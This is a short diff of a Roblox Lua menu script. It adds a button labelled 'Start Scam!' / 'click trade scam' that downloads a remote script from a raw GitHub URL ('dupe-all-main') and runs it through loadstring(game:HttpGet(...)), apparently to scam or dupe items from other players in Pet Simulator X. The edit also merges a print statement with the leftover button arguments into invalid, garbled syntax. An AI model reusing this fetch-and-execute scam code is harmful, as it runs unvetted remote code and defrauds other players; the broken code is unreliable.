@@ -32,11 +32,9 @@ Name = <string> - The name of the section.
 Tab:AddButton({
     Name = "Start Scam!",
     Callback = function()
-              print("button pressed")
-              MainSection:NewButton("click trade scam", "Script BY Scriptpsx", function()
+              print("button pressed""click trade scam", "Script BY Scriptpsx", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/HBHUB-hub/PSX-Scripe/main/dupe-all-main"))()
 end)
-
       end  
 
         
